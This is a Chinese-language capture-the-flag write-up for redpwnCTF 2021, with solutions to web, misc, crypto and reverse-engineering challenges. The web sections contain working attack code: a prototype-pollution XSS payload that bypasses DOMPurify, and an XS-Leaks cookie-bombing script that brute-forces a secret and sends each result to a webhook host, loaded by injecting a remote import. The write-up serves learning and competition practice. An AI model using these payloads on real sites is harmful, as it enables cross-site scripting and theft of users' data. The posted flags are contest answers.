{}["__proto__"]["error"] = "1";
{}["__proto__"]["message"] = "<img src=x onerror='alert(1)'>";
```

当请求被触发时，error和message就都是我们自定的值了；虽然DOMPurify会对`__proto__`进行移除，但是因为上面`const fieldsetName = decodeURIComponent(fieldset.name);`，所以再对`__proto__`来一手urlencode就能绕过了

```html
<form>
<fieldset name="%255F_proto__">
            <input name="error" value="1" />
            <input name="message" value="<img src=x onerror='alert(1)'>" />
<input value="Post Comment" type="submit" />
</fieldset>
</form>
```

## ***web/pastebin-3

> Boy, there sure are a lot of pastebins. Gotta think of new themes...
>
> *Please put a reasonably secure password when making an account*

还是一个很简单的页面 create paste，增加了一个搜索的功能

先看/view路由

![image-20210808142853227](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142853227.png)

![image-20210808141859178](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141859178.png)

我们的便签 总体会以一个url的形式放入iframe中，接着去看看sanbox_url的渲染情况

![image-20210808141709394](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808141709394.png)

而亮点是，我们的paste又被直接放入反引号中间了，如果我们用类似`${alert(1)}`的东西直接就可以跑js了！

![image-20210808142359209](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808142359209.png)

现在我们有了可以操作js代码的地方——但是这是在sandbox中，与主页面并不是同源的🤔

再看看新加入的search功能

![image-20210808143003626](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808143003626.png)

————这里要先插播一条知识了 [XSLeaks](https://xsleaks.dev/)（更多的相关参考链接放到后面了），一个常见的xsleak攻击详见[error events](https://xsleaks.dev/docs/attacks/error-events/)

*Cross-site leaks (aka XS-Leaks, XSLeaks) are a class of vulnerabilities derived from side-channels built into the web platform. They take advantage of the web’s core principle of composability, which allows websites to interact with each other, and abuse legitimate mechanisms to infer information about the user.    ——from XSLeaks wiki*

/search使用的是flask中的flash()消息闪现来展示搜索的结果，它会存储在session cookie中，如果消息比会话cookie大的话会导致消息闪现静默失败——我们利用这一条特性，用长长的cookie，如果请求成功 那么需要显示flash时cookie将会超过限制报错，而请求失败 就只有No results found短短的一条，不会报400

我们用XSLeaks wiki上给出的 probeError snippet

```js
function probeError(url) {
  let script = document.createElement('script');
  script.src = url;
  script.onload = () => console.log('Onload event triggered');
  script.onerror = () => console.log('Error event triggered');
  document.head.appendChild(script);
}
```

虽然同站的cookies（same-site cookies）通常会阻止这种情况，但由于题中的sandbox是子域，并不是同站的情况，所以probeError可以检测到，下面是脚本

```js
const alphabet = "abcdefghijklmnopqrstuvwxyz0123456789{}_ABCDEFGHIJKLMNOPQRSTUVWXYZ";

function set() {
    document.cookie = `a=${'a'.repeat(4096-90)}; domain=.pastebin-3.mc.ax`
    document.cookie = `b=${'a'.repeat(4096-90)}; domain=.pastebin-3.mc.ax`
}

function unset() {
    document.cookie = `a=; domain=.pastebin-3.mc.ax`
    document.cookie = `b=; domain=.pastebin-3.mc.ax`
}

function probeError(url) {
    return new Promise(resolve => {
        let script = document.createElement('script');
        script.src = url;
        script.onload = () => resolve(false);
        script.onerror = () => resolve(true);
        document.head.appendChild(script);
    });
}

function wait(time) {
    return new Promise(resolve => {
        setTimeout(resolve, time);
    });
}

(async () => {
    let prefix = "flag{c00k13_b0mb1n6_15_f4k3_vu";
    set();
    navigator.sendBeacon('https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?loaded');
    while (!prefix.endsWith('}')) {
        for (let i = 0; i < alphabet.length; i++) {
            let attempt = prefix + alphabet[i];

            let subwindow = window.open("https://pastebin-3.mc.ax/search?query=" + encodeURIComponent(attempt));
            await wait(500);
            subwindow.close();

            if (await probeError("https://pastebin-3.mc.ax/home")) {
                navigator.sendBeacon('https://webhook.site/e66e7e4f-1004-411a-86c9-71df69f20dd7?' + attempt);
                unset();
                prefix = attempt;
                break;
            }
        }
    }
})();
```

为了引入这个脚本，我们新建一个paste

```
${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
```

其他几个版本的脚本：[ver2](https://gist.github.com/parrot409/6782796ba9be2088a57a679c27f4e037) [ver3](https://gist.github.com/maple3142/10e3d6f03e307016e54e7f9b6073214a)

参考：[XSLeaks](https://xsleaks.dev/)  |  [Side Channel Vulnerabilities on  the Web - Detection and  Preventio](https://owasp.org/www-pdf-archive/Side_Channel_Vulnerabilities.pdf)  |  [Flask 消息闪现](https://dormousehole.readthedocs.io/en/latest/patterns/flashing.html)

## web/wtjs

> Ya like golf? How about JS golf?
>
> [wtjs.mc.ax](https://wtjs.mc.ax/)  |  [Admin bot](https://admin-bot.mc.ax/wtjs)
>
> Downloads: [wtjs.tar](https://static.redpwn.net/uploads/fb14645b75d85a5243bc734b968756485e25c3a1bcb969662a50de2a13982dcf/wtjs.tar)

![image-20210710163120317](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710163120317.png)

………………有字数限制的fuckjs，我不会构造 太痛苦了

wp参见[一张google sheet](https://docs.google.com/spreadsheets/d/1JGIqgt7aSLYM29ksMPIw2YmIRKEyIvZxXGQJfw7U9Fo/edit#gid=0) [wp2](https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#wtjs)

![image-20210716200428355](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200428355.png)

![image-20210716200446450](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200446450.png)

不得不说，这个sheet真的是相当清晰了……用9张表 详细的写了一下到底是怎么把最终的payload给拼出来的，真的是现代版活字印刷 绝了 数字民工是吧😅

![image-20210716203047760](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716203047760.png)

属实是蚌埠住了😅

## ***web/MdBin

> Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologies™, including React, this pastebin has you covered, with brand-new theming support!
>
> [mdbin.mc.ax](https://mdbin.mc.ax/)
>
> Submit to the admin at [admin-bot.mc.ax/mdbin](https://admin-bot.mc.ax/mdbin); the flag is in a cookie.
>
> Downloads: [mdbin.tar.gz](https://static.redpwn.net/uploads/35ee9be7cfa1b5fa6127e412b87ef3b8f6f1f99c676303db4cd18f13605281f5/mdbin.tar.gz)

参考：[wp1](https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/)  [wp2](https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#mdbin)

直接放参考的wp链接吧，还是js原型污染的问题，但是由于我对js原型污染这个问题了解的不够深入，也只能照猫画虎的复现，还有很多资料需要额外的去补充地看，就不班门弄斧了，上面的两个链接里写的都很好！

## ***web/lazy-admin

> Looks like another service with no functionality. I hope the admin is doing their job...
>
> [lazy-admin.mc.ax](https://lazy-admin.mc.ax/)
>
> Downloads: [lazy-admin.tar.gz](https://static.redpwn.net/uploads/5b2fc5a6d531a90e7f8f31975fcd4bdcd9863a5bb6bcb63df1d4cfd4ad7325b6/lazy-admin.tar.gz)

参考：[wp](https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#lazy-admin)

难，我不懂


## misc/sanity-check

> I get to write the sanity check challenge! Alright!
>
> `flag{1_l0v3_54n17y_ch3ck_ch4ll5}`

## misc/discord

> Join the [discord](https://pwn.red/discord)! I hear `#rules` is an incredibly engaging read.

![image-20210710124614902](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124614902.png)

## misc/compliant-lattice-feline

> get a flag!    `nc mc.ax 31443`

![image-20210710124835520](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124835520.png)

## *misc/the-substitution-game

> `nc mc.ax 31996`
>
> Downloads: [chall.py](https://static.redpwn.net/uploads/e8ab069cf5ede93ff8f0aec7f441b7f5f69500ff049b7c3fc27a5949ecc12d90/chall.py)

Markov Algorithm罢了

参见：[Markov Algorithm Online](https://mao.snuke.org/)

## misc/annaBEL-lee

> sounds from a kingdom by the sea
>
> The server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.
>
> What exactly *is* the server sending? Sometimes it makes a sound, sometimes it doesn't. Plotting it on a chart might help you see something.
>
> It might be helpful to turn your sound on, but you'll probably want to write all of it down since your terminal might not catch everything fast enough—maybe slow it down to get a better idea.
>
> This is not audio steganography. Apologies if anyone went down that route.
>
> `nc mc.ax 31845`

nc连入后没有任何可视的回显，但是藏在了声音信息里

```
\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
```

导出，有两种值：no bell(\x00) bell(\x07)，转化为0与1

```
101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
```

改为莫斯电码的样子

```
.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
```

解密

```
LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
```

`flag{d1ng-d0n9-g0es-th3-anna-b3l}`

## crypto/scissor

> I was given this string and told something about scissors.    `egddagzp_ftue_rxms_iuft_rxms_radymf`
>
> Downloads: [encrypt.py](https://static.redpwn.net/uploads/44dbfcfa8c7590e5afc686ce9d608ddf886c41ef1eee8b86a860af011dc26d73/encrypt.py)

![image-20210710135412576](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710135412576.png)

## crypto/baby

> I want to do an RSA!
>
> Downloads: [output.txt](https://static.redpwn.net/uploads/aaa49d90f7e2f6dda3ed8476879729955fefd68130dbc678e7d872dc2bcd825b/output.txt)

```
n: 228430203128652625114739053365339856393
e: 65537
c: 126721104148692049427127809839057445790
```

~~一点都不会crypto……~~    其实查一下`RSA n e c`其实就能做出来后面的东西了

[RSA decryption using only n e and c](https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c)  然后就会知道这个东西  [Ganapati](https://github.com/Ganapati)/[RsaCtfTool](https://github.com/Ganapati/RsaCtfTool)，或者这个在线网站 [RSA Cipher](https://www.dcode.fr/rsa-cipher)

为了decode首先需要根据N求出两个互质的p和q，可以用这个网站来做 [整数分解工具](https://zh.numberempire.com/numberfactorizer.php)

![image-20210716172732092](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172732092.png)

之后就可以愉快的解密了！

![image-20210716172627393](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172627393.png)

## rev/wstrings

> Some strings are wider than normal...
>
> Downloads: [wstrings](https://static.redpwn.net/uploads/c3c2ce7829ac7fb904ab02de13b4fbdda69232159c7a5dfa6d7d0fa37606a45d/wstrings)

![image-20210808184746679](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808184746679.png)

`flag{n0t_al1_str1ngs_ar3_sk1nny}`

## rev/bread-making

> My parents aren't home! Quick, help me make some bread please...    `nc mc.ax 31796`
>
> Downloads: [bread](https://static.redpwn.net/uploads/9eee9f077b941e88e1fe75d404582d4f286d9c74729f3ad0d1bb44a527579af8/bread)

![image-20210710154321719](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710154321719.png)

参考：[wp2](https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md)  [wp3](https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#bread-making)  [wp4](https://www.notion.so/bread-making-SOLVED-5cb97be799fc4fee8cd97738a9141713)

我当时的思路和想法大致还是对的，~~（虽然没有做出来吧）~~这个就是先提取出文件中的字符串部分，然后用逻辑 在交互模式下用正确的顺序输入 完整的顺下来这个流程，最后拿到flag，最后的正确顺序是这样的

```
add ingredients to the bowl
add flour
add yeast
add salt
add water
hide the bowl inside a box
wait 3 hours
work in the basement
preheat the toaster oven
set a timer on your phone
watch the bread bake
pull the tray out with a towel
unplug the fire alarm
open the window
unplug the oven
clean the counters
flush the bread down the toilet
wash the sink
get ready to sleep
close the window
replace the fire alarm
brush teeth and go to bed
```

![image-20210716181440958](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716181440958.png)

The flag is: `flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}`

调试的过程是linux下的py脚本

```
from pwn import *

p = remote("mc.ax", 31796)

p.sendlineafter("bowl", "add flour")
p.sendlineafter("flour has been added", "add yeast")
p.sendlineafter("yeast has been added", "add salt")
p.sendlineafter("salt has been added", "add water")
p.sendlineafter("lumpy dough", "hide the bowl inside a box")
p.sendlineafter("to rise", "wait 3 hours")
p.sendlineafter("finish the dough", "work in the basement")
p.sendlineafter("needs to be baked", "preheat the toaster oven")
p.sendlineafter("for 45 minutes", "set a timer on your phone")
p.sendlineafter("awfully long time", "watch the bread bake")
p.sendlineafter("no time to waste", "pull the tray out with a towel")
p.sendlineafter("smoke in the air", "unplug the fire alarm")
p.sendlineafter("in another room", "open the window")
p.sendlineafter("air rushes in", "unplug the oven")
p.sendlineafter("kitchen is a mess", "wash the sink")
p.sendlineafter("sink is cleaned", "clean the counters")
p.sendlineafter("counters are cleaned", "flush the bread down the toilet")
p.sendlineafter("is disposed of", "get ready to sleep")
p.sendlineafter("go to sleep", "close the window")
p.sendlineafter("window is closed", "replace the fire alarm")
p.sendlineafter("alarm is replaced", "brush teeth and go to bed")
p.interactive()
p.close()
```

这个脚本的逻辑是通过bread文件导出的文本，找出最符合逻辑的上下文 然后利用sendlineafer来解题；实际做题的话不可能只靠打字来试这个顺序 不是说试这个浪费时间 而是等待的时间非常非常短暂 没有完整打完字的时间

## 后记

这次的redpwn有47道题，各个方向都有适合我这种签到选手的简单题，好评~

就是打星号的题涉及到的js原型污染问题，光靠这一两个题搞不太懂，但是最近的反序列化问题还没总结完，三心二意的也不太好，但是之后一定会回来看的！！！等着被鞭尸吧 哼
